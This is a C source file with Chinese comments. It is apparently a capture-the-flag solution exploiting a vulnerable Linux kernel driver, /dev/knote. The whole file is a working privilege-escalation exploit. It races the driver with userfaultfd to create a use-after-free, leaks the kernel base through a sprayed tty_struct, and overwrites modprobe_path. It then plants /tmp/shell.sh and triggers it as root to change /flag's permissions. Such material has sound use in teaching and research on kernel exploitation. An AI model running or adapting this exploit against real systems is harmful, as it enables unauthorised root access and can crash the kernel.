#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/syscall.h>
#include <sys/mman.h>
//页大小
#define PAGE_SIZE 0x1000
//tty_struct的大小
#define TTY_STRUCT_SIZE 0X2E0
//cat /proc/kallsyms | grep modprobe_path
#define MOD_PROBE 0x145c5c0
//第二次利用时，堆统一的大小
//随便设置,过大过小都不好
#define CHUNK_SIZE 0x100
//modprobe_path的地址
size_t modprobe_path;

//驱动的文件描述符
int fd;
//ptmx的文件描述符
int tty_fd;

//传给驱动的数据结构
struct Data {
    union {
        size_t size; //大小
        size_t index; //下标
    };
    void *buf; //数据
};
void errExit(char *msg) {
    puts(msg);
    exit(-1);
}

void initFD() {
    fd = open("/dev/knote",O_RDWR);
    if (fd < 0) {
        errExit("device open error!!");
    }
}
//创建一个节点
void kcreate(size_t size) {
    struct Data data;
    data.size = size;
    data.buf = NULL;
    ioctl(fd,0x1337,&data);
}
//删除一个节点
void kdelete(size_t index) {
    struct Data data;
    data.index = index;
    ioctl(fd,0x6666,&data);
}
//编辑一个节点
void kedit(size_t index,void *buf) {
    struct Data data;
    data.index = index;
    data.buf = buf;
    ioctl(fd,0x8888,&data);
}
//显示节点的内容
void kshow(size_t index,void *buf) {
    struct Data data;
    data.index = index;
    data.buf = buf;
    ioctl(fd,0x2333,&data);
}


//注册一个userfaultfd来处理缺页错误
void registerUserfault(void *fault_page,void *handler)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features    = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        errExit("[-] ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; //我们要监视的区域
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) //注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
        errExit("[-] ioctl-UFFDIO_REGISTER");
    //开一个线程，接收错误的信号，然后处理
    int s = pthread_create(&thr, NULL,handler, (void*)uffd);
    if (s!=0)
        errExit("[-] pthread_create");
}

//针对laekKernelBase时的缺页处理线程
//这个线程里，我们不需要做什么，仅仅是
//为了拖延阻塞时间，给子进程足够的时间
//来形成一个UAF
void* leak_handler(void *arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long)arg;
    puts("[+] leak_handler created");
    sleep(3); //休眠一下，留给子进程足够时间操作
    struct pollfd pollfd;
    int nready;
    pollfd.fd     = uffd;
    pollfd.events = POLLIN;
    //poll会阻塞，直到收到缺页错误的消息
    nready = poll(&pollfd, 1, -1);
    if (nready != 1)
        errExit("[-] Wrong pool return value");
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0) {
        errExit("[-]msg error!!");
    }

    char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
        errExit("[-]mmap page error!!");
    struct uffdio_copy uc;
    //初始化page页
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long)page;
    //出现缺页的位置
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);;
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    //复制数据到缺页处，并恢复copy_user_generic_unrolled的执行
    //然而，我们在阻塞的这段时间，堆0的内容已经是tty_struct结构
    //因此，copy_user_generic_unrolled将会把tty_struct的结构复制给我们用户态
    ioctl(uffd, UFFDIO_COPY, &uc);

    puts("[+] leak_handler done!!");
    return NULL;
}

//泄露内核地址
void leakKernelBase() {
    //创建一个与tty_struct结构大小相同的堆
    kcreate(TTY_STRUCT_SIZE);
    //用于接收kshow的内容，由于我们是用mmap映射的一块区域，传入kshow时，导致缺页错误，从而可以进入我们自定义的
    //处理函数里阻塞
    char *user_buf = (char*)mmap(NULL,PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_buf == MAP_FAILED)
        errExit("[-] mmap user_buf error!!");
    //注册一个userfaultfd，监视user_buf处的缺页
    registerUserfault(user_buf,leak_handler);

    int pid = fork();
    if (pid < 0) {
        errExit("[-]fork error!!");
    } else if (pid == 0) { //子进程
        sleep(1); //让父进程先执行，进入userfaultfd阻塞，这样子线程可以为所欲为的操作
        kdelete(0); //删除我们创建的那个堆
        tty_fd = open("/dev/ptmx",O_RDWR); //这一步的作用是让tty_struct的结构申请到我们释放后的堆里，再用UAF就能泄露信息
        exit(0); //退出子进程
    } else {
        //父进程触发缺页错误，从而进入handle函数，阻塞，给子进程足够的操作时间
        kshow(0,user_buf);
        //现在，user_buf里存储着tty_struct结构，我们读出来，可以得到很多数据
        size_t *data = (size_t *)user_buf;
        if (data[7] == 0) { //没有数据，说明失败了
            munmap(user_buf, PAGE_SIZE);
            close(tty_fd);
            errExit("[-]leak data error!!");
        }
        close(tty_fd); //关闭ptmx设备,释放占用的空间
        //得到某函数的地址
        size_t x_fun_addr = data[0x56];
        //计算出内核基址
        size_t kernel_base = x_fun_addr - 0x5d4ef0;
        //当内核运行未知的二进制文件时，会调用modprobe_path指向的可执行文件
        //因此，我们的目的是劫持modprobe_path，指向一个shell文件即可
        modprobe_path = kernel_base + MOD_PROBE;
        printf("kernel_base=0x%lx\n",kernel_base);
        printf("modprobe_path=0x%lx\n",modprobe_path);
    }
}

//针对writeHeapFD时的缺页处理线程
//这个线程里，我们要把modprobe_path的地址
//写进去
void* write_handler(void *arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long)arg;
    puts("[+] write_handler created");
    sleep(3); //休眠一下，留给子进程足够时间操作，形成UAF
    struct pollfd pollfd;
    int nready;
    pollfd.fd     = uffd;
    pollfd.events = POLLIN;
    //poll会阻塞，直到收到缺页错误的消息
    nready = poll(&pollfd, 1, -1);
    if (nready != 1)
        errExit("[-] Wrong pool return value");
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0) {
        errExit("[-]msg error!!");
    }
    //断言是否是缺页的错误
    //assert(msg.event == UFFD_EVENT_PAGEFAULT);
    char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
        errExit("[-]mmap page error!!");
    struct uffdio_copy uc;
    //初始化page页
    memset(page, 0, sizeof(page));
    //写入modprobe_path
    memcpy(page,&modprobe_path,8);
    uc.src = (unsigned long)page;
    //出现缺页的位置
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);;
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    //复制数据到缺页处，并恢复copy_user_generic_unrolled的执行
    //然而，我们在阻塞的这段时间，堆0被释放掉了，当恢复的时候
    //是向一个已经释放的堆写数据
    ioctl(uffd, UFFDIO_COPY, &uc);
    puts("[+] writek_handler done!!");
    return NULL;
}


//条件竞争改写空闲堆块的next指针,使用与leakKernelBase同样的方法
void writeHeapFD() {
    kcreate(CHUNK_SIZE); //0
    //用于接收kedit的内容，由于我们是用mmap映射的一块区域，传入kedit时，导致缺页错误，从而可以进入我们自定义的
    //处理函数里阻塞
    char *user_buf = (char*)mmap(NULL,PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_buf == MAP_FAILED)
        errExit("[-] mmap user_buf error!!");
    //注册一个userfaultfd，监视user_buf处的缺页
    registerUserfault(user_buf,write_handler);
    int pid = fork();
    if (pid < 0) {
        errExit("[-]fork error!!");
    } else if (pid == 0) { //子进程
        sleep(1); //让父进程先执行，进入userfaultfd阻塞
        kdelete(0); //删除堆，形成UAF
        exit(0);
    } else {
        kedit(0,user_buf); //触发缺页错误阻塞
        //kedit结束后，空闲块的next域已经写上了攻击目标的地址
    }

}

char tmp[0x100] = {0};
int main() {
    //初始化驱动
    initFD();
    //条件竞争泄露内核基址
    leakKernelBase();
    sleep(2);
    //将modprobe_path地址写到空闲堆的next指针处
    writeHeapFD();
    sleep(2);
    kcreate(CHUNK_SIZE); //0
    kcreate(CHUNK_SIZE); //1，分配到目标处
    strcpy(tmp,"/tmp/shell.sh");
    kedit(1,tmp); //将modprobe_path指向我们的shell文件
    //创建一个用于getshelll的脚本
    system("echo '#!/bin/sh' >> /tmp/shell.sh");
    system("echo 'chmod 777 /flag' >> /tmp/shell.sh");
    system("chmod +x /tmp/shell.sh");
    //创建一个非法的二进制文件，执行，触发shell
    system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
    //触发shell执行，修改flag文件普通用户可以读写
    system("/tmp/fake");
    system("cat /flag");
    //结束程序时，会释放堆，但是我们的modprobe_path处不是合法的堆，会释放出错，导致内核崩溃重启
    sleep(3);
    return 0;
}
